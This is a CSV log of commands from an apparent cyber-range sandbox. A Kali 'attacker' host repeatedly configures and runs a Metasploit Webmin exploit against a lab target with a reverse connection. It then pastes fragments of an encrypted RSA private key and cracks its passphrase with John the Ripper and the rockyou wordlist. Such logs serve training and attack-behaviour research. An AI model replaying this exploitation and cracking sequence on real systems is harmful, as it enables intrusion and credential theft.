sandbox_id,cmd_type,cmd_name,cmd_arguments,hostname,ip,level,username,timestamp_str,relative_timestamp_str
649,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T07:16:41.218Z,1970-01-01T00:38:39.553Z
649,msf-command,help,NONE,attacker,10.1.135.83,36,null,2022-05-04T07:16:49.994Z,1970-01-01T00:38:48.329Z
649,msf-command,set,RHOSTS,attacker,10.1.135.83,36,null,2022-05-04T07:17:31.528Z,1970-01-01T00:39:29.863Z
649,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T07:17:44.489Z,1970-01-01T00:39:42.824Z
649,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T07:18:25.162Z,1970-01-01T00:40:23.497Z
649,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T07:18:29.882Z,1970-01-01T00:40:28.217Z
649,msf-command,set,lport 10000,attacker,10.1.135.83,36,null,2022-05-04T07:18:43.175Z,1970-01-01T00:40:41.510Z
649,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T07:18:45.489Z,1970-01-01T00:40:43.824Z
649,msf-command,exploit,RHOSTS,attacker,10.1.135.83,36,null,2022-05-04T07:18:56.424Z,1970-01-01T00:40:54.759Z
649,msf-command,exploit,-f,attacker,10.1.135.83,36,null,2022-05-04T07:20:19.098Z,1970-01-01T00:42:17.433Z
649,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T07:20:28.628Z,1970-01-01T00:42:26.963Z
649,msf-command,search,webmin,attacker,10.1.135.83,36,null,2022-05-04T07:20:44.418Z,1970-01-01T00:42:42.753Z
649,msf-command,use,5,attacker,10.1.135.83,36,null,2022-05-04T07:20:49.989Z,1970-01-01T00:42:48.324Z
649,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T07:21:09.150Z,1970-01-01T00:43:07.485Z
649,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T07:21:24.472Z,1970-01-01T00:43:22.807Z
649,msf-command,exploit,-f,attacker,10.1.135.83,36,null,2022-05-04T07:22:01.545Z,1970-01-01T00:43:59.880Z
649,msf-command,set,Rport 10000,attacker,10.1.135.83,36,null,2022-05-04T07:22:10.110Z,1970-01-01T00:44:08.445Z
649,msf-command,exploit,-f,attacker,10.1.135.83,36,null,2022-05-04T07:22:45.183Z,1970-01-01T00:44:43.518Z
649,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T07:22:50.477Z,1970-01-01T00:44:48.812Z
649,msf-command,show,RPORT,attacker,10.1.135.83,36,null,2022-05-04T07:22:57.995Z,1970-01-01T00:44:56.330Z
649,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T07:25:18.969Z,1970-01-01T00:47:17.304Z
649,msf-command,search,webmin,attacker,10.1.135.83,36,null,2022-05-04T07:25:30.752Z,1970-01-01T00:47:29.087Z
649,msf-command,use,5,attacker,10.1.135.83,36,null,2022-05-04T07:25:33.881Z,1970-01-01T00:47:32.216Z
649,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T07:25:45.096Z,1970-01-01T00:47:43.431Z
649,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T07:25:55.171Z,1970-01-01T00:47:53.506Z
649,msf-command,set,RHOSTS 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T07:26:11.457Z,1970-01-01T00:48:09.792Z
649,msf-command,set,LHOST 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T07:26:20.970Z,1970-01-01T00:48:19.305Z
649,msf-command,set,LPORT 10000,attacker,10.1.135.83,36,null,2022-05-04T07:26:28.489Z,1970-01-01T00:48:26.824Z
649,msf-command,set,LPORT 4444,attacker,10.1.135.83,36,null,2022-05-04T07:26:41.558Z,1970-01-01T00:48:39.893Z
649,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T07:26:53.549Z,1970-01-01T00:48:51.884Z
649,msf-command,search,webmin,attacker,10.1.135.83,36,null,2022-05-04T07:27:07.593Z,1970-01-01T00:49:05.928Z
649,msf-command,use,5,attacker,10.1.135.83,36,null,2022-05-04T07:27:10.173Z,1970-01-01T00:49:08.508Z
649,msf-command,set,RPORT 10000,attacker,10.1.135.83,36,null,2022-05-04T07:27:35.929Z,1970-01-01T00:49:34.264Z
649,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T07:27:44.149Z,1970-01-01T00:49:42.484Z
649,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T07:30:42.391Z,1970-01-01T00:52:40.726Z
649,msf-command,search,webmin,attacker,10.1.135.83,36,null,2022-05-04T07:30:54.810Z,1970-01-01T00:52:53.145Z
649,msf-command,use,5,attacker,10.1.135.83,36,null,2022-05-04T07:30:56.826Z,1970-01-01T00:52:55.161Z
649,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T07:31:14.835Z,1970-01-01T00:53:13.170Z
649,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T07:31:25.989Z,1970-01-01T00:53:24.324Z
649,msf-command,set,RPORT 10000,attacker,10.1.135.83,36,null,2022-05-04T07:31:38.442Z,1970-01-01T00:53:36.777Z
649,msf-command,exploit,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:40:11.943Z,1970-01-01T01:02:10.278Z
649,bash-command,msfconsole,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:40:15.784Z,1970-01-01T01:02:14.119Z
649,msf-command,search,webmin,attacker,10.1.135.83,38,null,2022-05-04T07:41:21.638Z,1970-01-01T01:03:19.973Z
649,msf-command,use,5,attacker,10.1.135.83,38,null,2022-05-04T07:41:23.542Z,1970-01-01T01:03:21.877Z
649,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,38,null,2022-05-04T07:41:39.237Z,1970-01-01T01:03:37.572Z
649,msf-command,set,RPORT 10000,attacker,10.1.135.83,38,null,2022-05-04T07:41:43.588Z,1970-01-01T01:03:41.923Z
649,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,38,null,2022-05-04T07:41:54.287Z,1970-01-01T01:03:52.622Z
649,bash-command,msfconsole,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:42:30.511Z,1970-01-01T01:04:28.846Z
649,msf-command,search,webmin,attacker,10.1.135.83,38,null,2022-05-04T07:42:45.426Z,1970-01-01T01:04:43.761Z
649,msf-command,use,5,attacker,10.1.135.83,38,null,2022-05-04T07:42:47.691Z,1970-01-01T01:04:46.026Z
649,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,38,null,2022-05-04T07:42:59.850Z,1970-01-01T01:04:58.185Z
649,msf-command,set,RPORT 10000,attacker,10.1.135.83,38,null,2022-05-04T07:43:04.086Z,1970-01-01T01:05:02.421Z
649,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,38,null,2022-05-04T07:43:11.441Z,1970-01-01T01:05:09.776Z
649,bash-command,msfconsole,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:47:11.202Z,1970-01-01T01:09:09.537Z
649,bash-command,nano,keyfile.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:47:49.893Z,1970-01-01T01:09:48.228Z
649,bash-command,cat,keyfile.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:47:58.934Z,1970-01-01T01:09:57.269Z
649,bash-command,cat,keyfile.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:48:07.698Z,1970-01-01T01:10:06.033Z
649,bash-command,vi,keyfile.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:48:31.556Z,1970-01-01T01:10:29.891Z
649,bash-command,rm,keyfile.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:48:41.646Z,1970-01-01T01:10:39.981Z
649,bash-command,cat,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:48:58.993Z,1970-01-01T01:10:57.328Z
649,bash-command,cat,keyfile.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:49:02.878Z,1970-01-01T01:11:01.213Z
649,bash-command,touch,keyfile.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:49:09.707Z,1970-01-01T01:11:08.042Z
649,bash-command,cat,keyfile.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:49:12.433Z,1970-01-01T01:11:10.768Z
649,msf-command,exploit,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:49:23.640Z,1970-01-01T01:11:21.975Z
649,bash-command,nano,keyfile.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:49:44.073Z,1970-01-01T01:11:42.408Z
649,bash-command,touch,key.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:49:55.683Z,1970-01-01T01:11:54.018Z
649,msf-command,-----BEGIN,RSA PRIVATE KEY-----,attacker,10.1.135.83,38,null,2022-05-04T07:50:31.220Z,1970-01-01T01:12:29.555Z
649,msf-command,Proc-Type:,4(comma)ENCRYPTED,attacker,10.1.135.83,38,null,2022-05-04T07:50:31.445Z,1970-01-01T01:12:29.780Z
649,msf-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,null,2022-05-04T07:50:31.583Z,1970-01-01T01:12:29.918Z
649,msf-command,Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2r...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:31.731Z,1970-01-01T01:12:30.066Z
649,msf-command,2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:31.871Z,1970-01-01T01:12:30.206Z
649,msf-command,yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:32.033Z,1970-01-01T01:12:30.368Z
649,msf-command,Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725t...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:32.199Z,1970-01-01T01:12:30.534Z
649,msf-command,9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:32.461Z,1970-01-01T01:12:30.796Z
649,msf-command,N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sD...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:32.715Z,1970-01-01T01:12:31.050Z
649,msf-command,BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:32.871Z,1970-01-01T01:12:31.206Z
649,msf-command,/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73o...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:33.027Z,1970-01-01T01:12:31.362Z
649,msf-command,5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpath...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:33.170Z,1970-01-01T01:12:31.505Z
649,msf-command,RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0D...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:33.304Z,1970-01-01T01:12:31.639Z
649,msf-command,vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/S...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:33.459Z,1970-01-01T01:12:31.794Z
649,msf-command,TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZ...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:33.804Z,1970-01-01T01:12:32.139Z
649,msf-command,pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQ...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:33.988Z,1970-01-01T01:12:32.323Z
649,msf-command,TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQg...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:34.173Z,1970-01-01T01:12:32.508Z
649,msf-command,0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68w...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:34.344Z,1970-01-01T01:12:32.679Z
649,msf-command,d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:34.504Z,1970-01-01T01:12:32.839Z
649,msf-command,qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwD...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:34.651Z,1970-01-01T01:12:32.986Z
649,msf-command,rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgsw...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:34.928Z,1970-01-01T01:12:33.263Z
649,msf-command,anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:35.094Z,1970-01-01T01:12:33.429Z
649,msf-command,FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:35.225Z,1970-01-01T01:12:33.560Z
649,msf-command,TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dD...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:35.355Z,1970-01-01T01:12:33.690Z
649,msf-command,aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6O...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:35.512Z,1970-01-01T01:12:33.847Z
649,msf-command,uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6I...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:35.668Z,1970-01-01T01:12:34.003Z
649,msf-command,pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfI...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:35.833Z,1970-01-01T01:12:34.168Z
649,msf-command,Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhm...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:36.141Z,1970-01-01T01:12:34.476Z
649,msf-command,/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:36.286Z,1970-01-01T01:12:34.621Z
649,msf-command,WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoX...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:36.439Z,1970-01-01T01:12:34.774Z
649,msf-command,bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:36.588Z,1970-01-01T01:12:34.923Z
649,msf-command,sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+Qn...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:36.747Z,1970-01-01T01:12:35.082Z
649,msf-command,I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:36.883Z,1970-01-01T01:12:35.218Z
649,msf-command,W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0I...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:37.172Z,1970-01-01T01:12:35.507Z
649,msf-command,KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5Ex...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:37.353Z,1970-01-01T01:12:35.688Z
649,msf-command,0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:37.512Z,1970-01-01T01:12:35.847Z
649,msf-command,y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUe...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:37.681Z,1970-01-01T01:12:36.016Z
649,msf-command,9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:37.816Z,1970-01-01T01:12:36.151Z
649,msf-command,rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Ie...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:37.966Z,1970-01-01T01:12:36.301Z
649,msf-command,22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwl...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:38.181Z,1970-01-01T01:12:36.516Z
649,msf-command,FEJ08UNnUQsuqoD+vPxunBwkFv5b/5yt0XMu9tZdXk9AW9BdasCIE1bY+...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:38.393Z,1970-01-01T01:12:36.728Z
649,msf-command,rjmFQ+KmCqH5lReI0Ai3fJ8pnZ2D3/m7AV/1llNaijp9NmriqK0jiVBpn...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:38.535Z,1970-01-01T01:12:36.870Z
649,msf-command,WtUQOqd4QS2S8MwjPoBZ0hpXOY0JX95EvWhp58uOy0/o8yYSbb+bZe7g0...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:38.673Z,1970-01-01T01:12:37.008Z
649,msf-command,Rj6xI5CiBdDo83VdQHlyaUawTlv/wUpqSRc9xsK/y2dLjzQhAD+QkWbm9...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:38.819Z,1970-01-01T01:12:37.154Z
649,msf-command,Tlqk1XDm0e9sNcXus5d5pnTWeCH4bnwnQDo0Ot/KljNmnG11/FXuPFnAT...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:38.956Z,1970-01-01T01:12:37.291Z
649,msf-command,SqV4xTHhlfTZQcjVD+Rc44JkIFTr2gzDvcLOOMwcBf232/ySokL9xuMlL...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:39.108Z,1970-01-01T01:12:37.443Z
649,msf-command,pG3A2vBQ1t0A62BglfKCobl9JVRwFhIIh4dzevvvtCuWnXk7AhodGIVF2...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:39.390Z,1970-01-01T01:12:37.725Z
649,msf-command,q5ydQjEjf0ByejEAZt7EM14Ey9sHQhX83OWMb7Brqfzsfapkuplvnj1+k...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:39.537Z,1970-01-01T01:12:37.872Z
649,msf-command,ytH5k1zr7ZQ5k2FasEDPwdVjSQfOW8G3CJ8GgpFokCL+KiwfvR3mJBM5u...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:39.697Z,1970-01-01T01:12:38.032Z
649,msf-command,UG2CX9gT4nU7h9RAhtu2p/F5FEGLVbX5GxJhvKP11MQqSsWI3OY3gTvG6...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:39.834Z,1970-01-01T01:12:38.169Z
649,msf-command,r4aMTuuESZSksPLDMwgkYTvWp/qaNnVpqaSHe1p2hk2DvEhIH7eSkK9gA...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:39.986Z,1970-01-01T01:12:38.321Z
649,msf-command,sah7VmkiXIRvhXdcVA/QXlpG7NfOVGfm/zVDfpWPAGUrGegNb3X5Y6QTz...,NONE,attacker,10.1.135.83,38,null,2022-05-04T07:50:40.122Z,1970-01-01T01:12:38.457Z
649,bash-command,nano,key.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:51:28.860Z,1970-01-01T01:13:27.195Z
649,bash-command,john,--wordlist=/usr/share/wordlists/rockyou.txt hash,attacker,10.1.135.83,38,kali,2022-05-04T07:51:41.425Z,1970-01-01T01:13:39.760Z
649,bash-command,msfconsole,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:52:13.443Z,1970-01-01T01:14:11.778Z
649,msf-command,search,webmin,attacker,10.1.135.83,38,null,2022-05-04T07:52:28.925Z,1970-01-01T01:14:27.260Z
649,msf-command,use,5,attacker,10.1.135.83,38,null,2022-05-04T07:52:32.181Z,1970-01-01T01:14:30.516Z
649,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,38,null,2022-05-04T07:52:44.816Z,1970-01-01T01:14:43.151Z
649,msf-command,set,RPORT 10000,attacker,10.1.135.83,38,null,2022-05-04T07:52:50.623Z,1970-01-01T01:14:48.958Z
649,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,38,null,2022-05-04T07:52:58.373Z,1970-01-01T01:14:56.708Z
649,bash-command,nano,key.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:53:41.787Z,1970-01-01T01:15:40.122Z
649,msf-command,search,webmin,attacker,10.1.135.83,38,null,2022-05-04T07:53:59.171Z,1970-01-01T01:15:57.506Z
649,msf-command,use,5,attacker,10.1.135.83,38,null,2022-05-04T07:54:11.956Z,1970-01-01T01:16:10.291Z
649,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,38,null,2022-05-04T07:54:25.553Z,1970-01-01T01:16:23.888Z
649,msf-command,set,RPORT 10000,attacker,10.1.135.83,38,null,2022-05-04T07:54:30.959Z,1970-01-01T01:16:29.294Z
649,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,38,null,2022-05-04T07:54:38.476Z,1970-01-01T01:16:36.811Z
649,bash-command,nano,key.txt,attacker,10.1.135.83,38,kali,2022-05-04T07:55:52.192Z,1970-01-01T01:17:50.527Z
649,bash-command,touch,key,attacker,10.1.135.83,38,kali,2022-05-04T07:56:01.009Z,1970-01-01T01:17:59.344Z
649,bash-command,nano,key,attacker,10.1.135.83,38,kali,2022-05-04T07:56:51.969Z,1970-01-01T01:18:50.304Z
649,bash-command,cat,key,attacker,10.1.135.83,38,kali,2022-05-04T07:56:56.613Z,1970-01-01T01:18:54.948Z
649,bash-command,python3-----BEGIN,RSA PRIVATE KEY-----,attacker,10.1.135.83,38,kali,2022-05-04T07:58:05.819Z,1970-01-01T01:20:04.154Z
649,bash-command,python3-----BEGIN,RSA PRIVATE KEY-----,attacker,10.1.135.83,38,kali,2022-05-04T07:58:05.843Z,1970-01-01T01:20:04.178Z
649,bash-command,Proc-Type:,4(comma)ENCRYPTED,attacker,10.1.135.83,38,kali,2022-05-04T07:58:05.962Z,1970-01-01T01:20:04.297Z
649,bash-command,Proc-Type:,4(comma)ENCRYPTED,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06Z,1970-01-01T01:20:04.335Z
649,bash-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.137Z,1970-01-01T01:20:04.472Z
649,bash-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.174Z,1970-01-01T01:20:04.509Z
649,bash-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.210Z,1970-01-01T01:20:04.545Z
649,bash-command,DEK-Info:,AES-128-CBC(comma)48A98AC639005A4158AA7B9CEEF483C4,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.247Z,1970-01-01T01:20:04.582Z
649,bash-command,Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2r...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.322Z,1970-01-01T01:20:04.657Z
649,bash-command,Ps9uCxB/vjzzEwZU+BjohF/sb/kaa+thfeYki9iFGqVQpHbPhdZU7JO2r...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.359Z,1970-01-01T01:20:04.694Z
649,bash-command,2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.433Z,1970-01-01T01:20:04.768Z
649,bash-command,2OG1q9DAD07fQPpCmX5vqWAdmeaWq//2k3zRVsadFF3daPGjWs1f61j4/...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.470Z,1970-01-01T01:20:04.805Z
649,bash-command,yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.658Z,1970-01-01T01:20:04.993Z
649,bash-command,yeX8g98mtBLBas7bUFuo4jVroEUaoF0fpa0Up+mOAC3rY3tsprpfofQu+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.694Z,1970-01-01T01:20:05.029Z
649,bash-command,Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725t...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.767Z,1970-01-01T01:20:05.102Z
649,bash-command,Bq2CuS5LcqbfVfl9737XeC+DNls/AmkLmYU/1NLKp1hWSpx0/dfJu725t...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.803Z,1970-01-01T01:20:05.138Z
649,bash-command,9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:06.993Z,1970-01-01T01:20:05.328Z
649,bash-command,9lS9eEPebv4V8mUNU+bsh5YQbVrVmryO9BRLBl4ZK82SO7tnyObpWfsa2...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.032Z,1970-01-01T01:20:05.367Z
649,bash-command,N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.106Z,1970-01-01T01:20:05.441Z
649,bash-command,N/jFdUnWSkA2wEgzupDZmPU6jyJ/BosOxJVkih4oQB1s9BO+HzI7oA5sD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.143Z,1970-01-01T01:20:05.478Z
649,bash-command,BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.217Z,1970-01-01T01:20:05.552Z
